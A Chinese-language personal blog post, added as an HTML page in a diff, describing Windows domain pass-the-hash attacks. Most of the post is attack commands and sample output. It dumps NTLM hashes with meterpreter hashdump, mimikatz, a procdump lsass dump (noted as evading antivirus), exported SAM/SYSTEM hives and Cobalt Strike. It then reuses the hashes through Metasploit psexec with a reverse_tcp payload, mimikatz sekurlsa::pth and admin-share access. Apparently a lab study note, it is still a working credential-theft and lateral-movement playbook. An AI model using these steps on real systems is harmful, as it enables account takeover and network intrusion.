@@ -1,0 +1,191 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Hexo | Hexo</title><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="PTH如果找到了某个用户的ntlm hash，就可以拿这个ntlm hash当作凭证进行远程登陆了其中若hash加密方式是 rc4 ，那么就是pass the hash若加密方式是aes key,那么就是pass the key注意NTLM和kerberos协议均存在PTH:NTLM自然不用多说kerberos协议也是基于用户的client hash开始一步步认证的，自然也会受PTH影响 那前提就">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/2021/02/16/%E5%9F%9F%E5%9F%BA%E6%9C%AC%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="PTH如果找到了某个用户的ntlm hash，就可以拿这个ntlm hash当作凭证进行远程登陆了其中若hash加密方式是 rc4 ，那么就是pass the hash若加密方式是aes key,那么就是pass the key注意NTLM和kerberos协议均存在PTH:NTLM自然不用多说kerberos协议也是基于用户的client hash开始一步步认证的，自然也会受PTH影响 那前提就">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/null">
+<meta property="article:published_time" content="2021-02-16T15:57:22.365Z">
+<meta property="article:modified_time" content="2021-02-16T09:56:36.869Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/null"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2021/02/16/%E5%9F%9F%E5%9F%BA%E6%9C%AC%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-02-16 17:56:36'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">4</div></a></div></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Hexo</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">No title</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-02-16T15:57:22.365Z" title="Created 2021-02-16 23:57:22">2021-02-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-02-16T09:56:36.869Z" title="Updated 2021-02-16 17:56:36">2021-02-16</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h1><p>如果找到了某个用户的ntlm hash，就可以拿这个ntlm hash当作凭证进行远程登陆了<br>其中若hash加密方式是 rc4 ，那么就是pass the hash<br>若加密方式是aes key,那么就是pass the key<br>注意NTLM和kerberos协议均存在PTH:<br>NTLM自然不用多说<br>kerberos协议也是基于用户的client hash开始一步步认证的，自然也会受PTH影响</p>
+<p>那前提就是要获取hash值了</p>
+<h2 id="HASH获取"><a href="#HASH获取" class="headerlink" title="HASH获取"></a>HASH获取</h2><p>1.使用meterpreter里的mimikatz模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt;load mimikatz</span><br><span class="line">meterpreter&gt;mimikatz_command -f mimikatz的指令</span><br><span class="line">privilege::debug 提权  samdump::hashes dump哈希  </span><br><span class="line">或者</span><br><span class="line">meterpreter&gt;msv&#x2F;kerberos&#x2F;widgst</span><br></pre></td></tr></table></figure>
+<p>2.使用meterpreter自带的hash获取模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt;hashdump</span><br><span class="line">meterpreter&gt;run windows&#x2F;gather&#x2F;smart_hashdump   (推荐使用这个)</span><br></pre></td></tr></table></figure>
+<p>3.向目标机上传mimikatz远程调用mimikatz.exe dump出hash，mimikatz需要免杀处理<br>意思就是既然我们获取到了shell，我们直接向目标机上传一个mimikatz然后在shell里使用它就行了. 使用方法为cmd窗口打开mimikatz.exe，进入mimikatz终端，然后输入mimikatz指令即可</p>
+<p>4.上传procdump到目标机，获取到lsass.dmp文件后将其传回本地又mimikatz来dump哈希</p>
+<p>procdump.exe是微软自带的程序，所以不会触发杀毒。所以可以通过它传回lsass.dmp本地提取hash</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp  执行该指令，获取到lsass.dmp</span><br><span class="line">然后将其传回本地</span><br><span class="line">通过mimikatz.exe分别执行以下命令</span><br><span class="line">&quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot;</span><br></pre></td></tr></table></figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="img/image.png" alt="img" title="">
+                </div>
+                <div class="image-caption">img</div>
+            </figure>
+
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">Procdump</a>：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a><br><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/releases">mimikatz</a>：<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p>
+<p>5.使用cobalt strike 获取hash</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt;hashdump</span><br><span class="line">beacon&gt;mimikatz mimikatz指令</span><br></pre></td></tr></table></figure>
+<p>6.利用sam表</p>
+<p>mimikatz在线读sam表中的hash</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure>
+<p>将sam表下载到本地由mimikatz分析</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM SYSTEM</span><br><span class="line">reg save HKLM\SAM SAM</span><br><span class="line">在远端shell使用以上命令导出SYSTEM 和 SAM文件，并将其待会本地，由mimikatz分析</span><br><span class="line">mimikatz运行</span><br><span class="line">mimikatz # lsadump::sam &#x2F;sam:SAM &#x2F;system:SYSTEM</span><br><span class="line">Domain : STU1</span><br><span class="line">SysKey : fd4639f4e27c79683ae9fee56b44393f</span><br><span class="line">Local SID : S-1-5-21-1982601180-2087634876-2293013296</span><br><span class="line"></span><br><span class="line">SAMKey : 099d1915db1b0e5cf41f1f0908dc7e17</span><br><span class="line"></span><br><span class="line">RID  : 000001f4 (500)</span><br><span class="line">User : Administrator</span><br><span class="line">  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line"></span><br><span class="line">RID  : 000001f5 (501)</span><br><span class="line">User : Guest</span><br><span class="line"></span><br><span class="line">RID  : 000003e8 (1000)</span><br><span class="line">User : liukaifeng01</span><br><span class="line">  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0</span><br></pre></td></tr></table></figure>
+<h2 id="hash-传递攻击-PTH-（Pass-the-Hash"><a href="#hash-传递攻击-PTH-（Pass-the-Hash" class="headerlink" title="hash 传递攻击 PTH （Pass the Hash)"></a>hash 传递攻击 PTH （Pass the Hash)</h2><p>1.msf里使用psexec模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi&#x2F;handler) &gt; use exploit&#x2F;windows&#x2F;smb&#x2F;psexec  &#x2F;&#x2F;以root启动msf</span><br><span class="line">[*] No payload configured, defaulting to windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set lhsot 192.168.64.133</span><br><span class="line">lhsot &#x3D;&gt; 192.168.64.133</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set lhost 192.168.64.133</span><br><span class="line">lhost &#x3D;&gt; 192.168.64.133</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set lport 443</span><br><span class="line">lport &#x3D;&gt; 443</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set rhost 192.168.52.138</span><br><span class="line">rhost &#x3D;&gt; 192.168.52.138</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set SMBUser Administrator</span><br><span class="line">SMBUser &#x3D;&gt; Administrator</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; set SMBPass 8a963371a63944419ec1adf687bb1be5  &#x2F;&#x2F;一般选择NTLM HASH</span><br><span class="line">SMBPass &#x3D;&gt; 8a963371a63944419ec1adf687bb1be5</span><br><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;psexec) &gt; run</span><br></pre></td></tr></table></figure>
+<p>2.使用mimikatz</p>
+<p>我们在目标机里放置mimikatz.exe 然后执行以下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth &#x2F;user:administrator &#x2F;domain:&quot;xxx.com&quot; &#x2F;ntlm:6542d35ed5ff6ae5e75b875068c5d3bc  &#x2F;&#x2F;自行修改</span><br></pre></td></tr></table></figure>
+<p>之后便会弹出一个cmd窗口，在这个窗口里链接机器即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.222.131\c$</span><br></pre></td></tr></table></figure>
+<p>3.使用cobalt strike</p>
+<p>在cobalt strike里找到域控，然后使用psexec模块，选择一个本地hash即可。</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="img/image-9.png" alt="img" title="">
+                </div>
+                <div class="image-caption">img</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="img/image-10.png" alt="img" title="">
+                </div>
+                <div class="image-caption">img</div>
+            </figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">John Doe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2021/02/16/%E5%9F%9F%E5%9F%BA%E6%9C%AC%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/">http://example.com/2021/02/16/%E5%9F%9F%E5%9F%BA%E6%9C%AC%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/null" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2021/02/16/Windows%E5%9F%9F%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D/"><img class="next-cover" src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info"></div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/null" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">John Doe</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">4</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PTH"><span class="toc-number">1.</span> <span class="toc-text">PTH</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#HASH%E8%8E%B7%E5%8F%96"><span class="toc-number">1.1.</span> <span class="toc-text">HASH获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hash-%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB-PTH-%EF%BC%88Pass-the-Hash"><span class="toc-number">1.2.</span> <span class="toc-text">hash 传递攻击 PTH （Pass the Hash)</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><div class="content"><a class="title" href="/2021/02/16/%E5%9F%9F%E5%9F%BA%E6%9C%AC%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/" title="No title">No title</a><time datetime="2021-02-16T15:57:22.365Z" title="Created 2021-02-16 23:57:22">2021-02-16</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2021/02/16/Windows%E5%9F%9F%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D/" title="No title">No title</a><time datetime="2021-02-16T15:57:22.364Z" title="Created 2021-02-16 23:57:22">2021-02-16</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2021/02/16/Windows%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%BB%E6%B1%87/" title="No title">No title</a><time datetime="2021-02-16T15:57:22.362Z" title="Created 2021-02-16 23:57:22">2021-02-16</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2021/02/16/world/" title="No title">No title</a><time datetime="2021-02-16T15:54:06.172Z" title="Created 2021-02-16 23:54:06">2021-02-16</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By John Doe</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
